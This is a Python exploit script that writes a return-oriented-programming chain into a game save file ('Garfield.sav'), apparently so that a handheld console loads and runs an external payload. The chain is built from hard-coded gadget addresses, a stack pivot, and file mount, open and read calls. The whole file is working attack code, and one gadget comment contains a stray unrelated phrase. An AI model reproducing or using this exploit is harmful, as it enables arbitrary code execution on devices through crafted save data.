import os,sys,struct

filename="Garfield.sav"
STR_ADDR=0x1559c350 #EUR 0x1559c2d0
SETUP=0x0043f884    #EUR 0x0043f882
STACK_PIVOT=0x00165bac #: mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
GARBAGE=0x44444444
POPPC=0x00114aec
POP_R0PC=0x0015be1c
POP_R1PC=0x00151650
POP_R0R4PC=0x0010974c #: pop {r0, r1, r2, r3, r4, pc}
ROP_STR_R0TOR1=0x0013b098

FILE=0x00230800
FILENAME=0x0ffffe5c
DEST=0x00231000
SIZE=0x11000
TERM=FILENAME+0x24
ROP_ADDR=0

MNT=0x00116b8c+4
ARCH=0x0FFFFc46
OPEN=0x001521f8+4
READ=0x0011df78+4

SP=0x0ffffcb8 # address of ropkit in bss
#SP=ARCH-6
PC=POPPC

READOP_FIX=0x00121c88
TERM_FIX=0x0015b480
#0x0015b480 : mov r0, #0 ; str r0, [r4] ; pop {r4, pc} ;
#0x00121c88 : mov r1, #1 ; str r1, [r0] ; bx lr
#0x00132d10 : mov r0, lr ; pop {r4, r5, r6, r7, r8, sb, sl, pc}
#0x001469e0 : str lr, [r0, #0xc] ; pop {pc} "in deep development on a number of key projects"
#0x0015e8a0 : str lr, [r0, #4] ; nop ; pop {r4, pc}
#0x001007bc : ldmdb r6, {r0, r2, r5, r6, ip, sp, lr, pc} 


'''
with open("payload.bin","rb") as f:
	ropkit=f.read()
with open("otherapp.bin","rb") as f:
	otherapp=f.read()
'''

def write32(gadget_addr, file_offset):
	global filename
	with open(filename,"rb+") as f:
		f.seek(file_offset)
		f.write(struct.pack("<I", gadget_addr))
		
def rop(gadget_addr):
	global ROP_ADDR
	with open(filename,"rb+") as f:
		f.seek(ROP_ADDR)
		f.write(struct.pack("<I", gadget_addr))
	ROP_ADDR+=4
write32(SETUP, 0xf8)
write32(STR_ADDR, 0xb4) #EUR write32(STR_ADDR, 0xac)
write32(POPPC, 0x26e+4)
write32(TERM, 0x26e+8)

write32(POP_R0PC, 0x296+0)
write32(SP, 0x296+4)
write32(POP_R1PC, 0x296+8)
write32(PC, 0x296+12)
write32(STACK_PIVOT, 0x296+16)


ROP_ADDR=0x112
rop(POP_R0PC)
rop(	0x0FFFFcf8)
rop(READOP_FIX)
rop(TERM_FIX)
rop(	GARBAGE)
rop(POP_R0PC)
rop(	ARCH)
rop(MNT)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0R4PC | 0x00000000)
rop(	FILE)
rop(	FILENAME)
rop(	0x88888888)
rop(	GARBAGE)
rop(	GARBAGE)
rop(OPEN)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0R4PC | 0x00000000)
rop(	FILE)
rop(	FILE+32)
rop(	DEST)
rop(	SIZE)
rop(	GARBAGE)
rop(READ)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(	GARBAGE)
rop(POP_R0PC)
rop(	DEST+0x2e0)
rop(POP_R1PC)
rop(	POPPC)
rop(STACK_PIVOT)
'''
rop(POP_R0PC)
rop(	FILENAME-4)
rop(POP_R1PC)
rop(	POPPC)
rop(STACK_PIVOT)
'''




'''
write32(LEVEL_ADDR, 0x1CC, "0a")

write32(JUMP_ADDR, 0x1720, "0")
write32(STACK_PIVOT, 0x171C, "0")
write32(SP, 0x1738, "0")
write32(PC, 0x1740, "0")
'''
